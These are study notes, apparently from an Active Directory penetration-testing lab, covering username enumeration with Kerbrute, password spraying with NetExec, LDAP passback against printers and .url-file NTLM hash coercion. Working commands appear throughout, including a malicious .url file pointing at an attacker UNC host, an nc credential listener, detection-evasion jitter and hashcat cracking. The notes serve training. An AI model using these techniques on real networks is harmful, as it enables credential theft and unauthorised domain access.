## Intro to Breaching AD — Initial Recon & Username Enumeration

### Goal
Before launching active attacks, build a validated list of usernames 
that exist in the target domain starting from OSINT, then confirming 
via Kerberos.

### OSINT: Gathering Potential Usernames
Public sources commonly used to build an initial name/username list:
- **LinkedIn** — employee names, titles, org structure; tools like 
  `linkedin2username` automate scraping + username-format generation
- **GitHub/GitLab** — commits using corporate email addresses reveal 
  email/username format
- **Public data breaches** — breach databases may expose target-domain 
  email addresses directly
- **Corporate websites** — "About Us"/"Meet the Team" pages list names
- **Job listings** — can reveal tech stack, team structure, naming conventions

### Common AD Username Formats
| Format | Example (Jane Smith) |
|---|---|
| first.last | jane.smith |
| firstlast | janesmith |
| flast | jsmith |
| first.l | jane.s |
| first | jane |
| last.first | smith.jane |

A single confirmed email/username is often enough to identify which 
convention the organisation uses, letting you generate a full candidate 
list from gathered names.

### Validating Usernames with Kerbrute
Kerbrute abuses **Kerberos pre-authentication** behavior in the AS-REQ 
exchange:
- Non-existent username → KDC returns `KDC_ERR_C_PRINCIPAL_UNKNOWN`
- Existing username → KDC requests pre-authentication (confirms validity)

**Key advantage:** doesn't trigger account lockouts (failed pre-auth isn't 
counted as a failed login) — but it does generate **Windows Event ID 4768** 
on the DC, so it's not fully silent.

**Usage:**
```bash
kerbrute userenum -d thm.loc --dc <dc IP> /path/to/usernamesfile.txt
```
- `userenum` — Kerbrute's username enumeration module
- `-d thm.loc` — target domain (used as the Kerberos realm)
- `--dc <IP>` — domain controller to query (else resolved via DNS SRV)
- `/root/usernames.txt` — candidate username wordlist
- `-o valid_users.txt` — optionally save output for later use

Confirmed usernames (`[+] VALID USERNAME`) feed into later steps — 
password spraying and credential-hunting tasks.

### Supplementary: DNS Enumeration
DNS underpins AD — DCs, mail servers, etc. are all registered as records.

```bash
# Locate domain controllers
nslookup -type=SRV _ldap._tcp.dc._msdcs.thm.loc 192.168.12.100

# Locate the Kerberos KDC
nslookup -type=SRV _kerberos._tcp.thm.loc 192.168.12.100

# Locate mail servers
nslookup -type=MX thm.loc 192.168.12.100
```

Helps map network topology (DCs, mail infra, etc.) before active attacks begin.

## Credential Discovery
Looking through GitHub or Jenkins. Commits or build history can leak credentials.  

## Password Spraying Against AD

### Context
With a validated username list (from username enumeration) and possibly 
partial intel (default passwords, naming patterns, a full credential pair), 
the next move — if no valid creds yet — is **password spraying**.

### Password Spraying vs. Brute-Forcing
| | Brute-forcing | Password spraying |
|---|---|---|
| Target | One account, many passwords | Many accounts, one password at a time |
| Lockout risk | High — almost guaranteed | Low — stays under threshold |

Spraying works because users gravitate toward predictable patterns despite 
complexity rules:
- `SeasonYear!` (e.g. `Summer2025!`)
- CompanyName + number (e.g. `MegaCorp01!`)
- Default onboarding passwords

### Understanding Lockout Policies First
Spraying blind is dangerous — e.g. a 5-attempts/30-min lockout policy means 
3 rapid passwords can lock out the entire user list.

**Safe approach:**
- Spray **one password** across the whole list, then wait for the lockout 
  window to reset before the next
- If you already hold one valid credential, query the policy first:

```bash
nxc smb 192.168.12.100 -u 'validuser' -p 'validpassword' --pass-pol
```
Returns lockout threshold, reset window, complexity rules, etc. — e.g. 
threshold 5 / reset 30 min → safely spray **up to 4 passwords per 30 minutes**.

> No creds to check the policy? Assume a conservative threshold and spray 
> one password at a time with generous delays.

### Spraying with NetExec (nxc)
Successor to CrackMapExec; supports SMB, LDAP, WinRM, RDP, MSSQL for 
authentication testing.

**Clean up Kerbrute output first:**
```bash
grep "VALID USERNAME" valid_users.txt | awk '{print $NF}' | sed 's/@thm.loc//' > clean_users.txt
```

**Spray one password across all usernames over SMB:**
```bash
nxc smb 192.168.12.100 -u clean_users.txt -p 'MegaCorp01!' --continue-on-success
```
- `smb` — protocol (SMB/445 is the typical DC spray target)
- `-u clean_users.txt` — usernames to test
- `-p 'MegaCorp01!'` — single password sprayed across all accounts
- `--continue-on-success` — keep testing after first hit (default stops early)

### Interpreting Results
| Status | Meaning |
|---|---|
| `[+]` | Valid credential pair — success |
| `[-] STATUS_LOGON_FAILURE` | Wrong password (expected/normal) |
| `[-] STATUS_ACCOUNT_DISABLED` | Account exists but disabled — doesn't count toward lockout, unusable |
| `[-] STATUS_ACCOUNT_LOCKED_OUT` | **Stop spraying immediately** — review lockout policy |
| `(Pwn3d!)` | Successful login **also** has local admin on the host — bigger win |

**Tip:** add random delays to reduce lockout/detection risk:
```bash
nxc smb 192.168.12.100 -u clean_users.txt -p 'MegaCorp01!' --continue-on-success --jitter 2-5
```

### Other Spray Targets
Beyond SMB, AD-integrated services also accept spraying: OWA, RDP, VPN 
portals, LDAP. NetExec supports these natively — just swap `smb` for 
`rdp`, `ldap`, `winrm`, or `mssql`.

## Authentication Coercion Attacks

### Overview
Coercion attacks (MITRE ATT&CK **T1187 — Forced Authentication**) trick a 
device or user into sending authentication material to an attacker-controlled 
listener — no credential guessing or discovery required. Two beginner 
techniques: **LDAP passback** (against a misconfigured printer) and 
**file-based coercion** (via a writable file share).

---

### 1. LDAP Passback Attack

**Concept:** Network devices (printers, MFPs) store LDAP service account 
credentials to bind to the DC for directory lookups (scan-to-email, 
address book, etc.). Redirecting the device's LDAP target to an attacker 
listener captures those credentials.

**Why it works — common device weaknesses:**
- **Default admin creds** left unchanged (e.g. `admin:admin` HP, blank 
  password Ricoh, `ADMIN:canon`)
- **Over-privileged service accounts** — sometimes Domain Admin
- **Plaintext LDAP (port 389)** instead of LDAPS (636) — creds sent in clear text
- **No credential rotation** — captured creds may stay valid for years

**Attack flow:**
1. Log into the device's web admin panel (default/weak creds)
2. Go to LDAP configuration
3. Replace the legitimate LDAP server IP with the attacker's IP (+ custom port)
4. Save, then set up a listener before triggering the test:
```bash
   nc -lvnp 3489
```
5. Click **Test Connection** on the device — it sends stored LDAP creds 
   to the listener

**Captured output example:**
`CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc <plaintext password>`

**Verify credentials:**
```bash
nxc smb 192.168.12.100 -u 'svc.ldap' -p 'CAPTURED_PASSWORD'
```
> Note: modern devices using SASL/TLS-wrapped LDAP won't hand over plaintext 
> to a plain Netcat listener — a rogue LDAP server (`slapd`, Impacket's 
> `ldapd.py`) would be needed instead.

---

### 2. File-Based Coercion (.url Icon Trick)

**Concept:** Windows Explorer auto-renders file icons when a share is 
opened. A `.url` file's `IconFile` field pointing to a UNC path on the 
attacker's host forces the browsing user's machine to silently send its 
**NTLMv2 hash** via SMB — no click/open required.

> Older `.scf`/`desktop.ini` variants are patched on current Windows; 
> `.url` files remain effective.

**Malicious `.url` file:**
```ini
[InternetShortcut]
URL=http://thm.loc
WorkingDirectory=thm
IconFile=\\<ATTACKER_TUN0_IP>\icons\icon.ico
IconIndex=1
```
- `IconFile` — the critical field; UNC path triggers SMB auth to attacker
- Filename prefixed `@` (e.g. `@Shortcut.url`) — sorts to top of listing, 
  loads first
- Must heredoc with `'EOF'` (quoted) so bash doesn't mangle the backslashes

**Setup listener (Responder):**
```bash
sudo responder -I tun0
```
Captures NTLM auth attempts across multiple protocols (SMB/445, etc.)

**Upload file to a writable share:**
```bash
smbclient //SERVER1.thm.loc/shared-docs -U 'THM\alice.moore%MegaCorp01!'
put @Shortcut.url
```

**Captured hash (example):**
`[SMB] NTLMv2-SSP Username : THM\sarah.jones`
`[SMB] NTLMv2-SSP Hash : sarah.jones::THM:...`


**Cracking (NetNTLMv2 ≠ usable for pass-the-hash — must crack offline):**
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

### Key Takeaway
Both techniques yield credentials **without spraying or exposed-secret 
discovery** — by exploiting devices/systems that authenticate automatically 
under the hood:
| Technique | Captured | Usable As-Is? |
|---|---|---|
| LDAP passback | Plaintext password | Yes |
| File-based coercion | NTLMv2 hash | No — must crack offline |
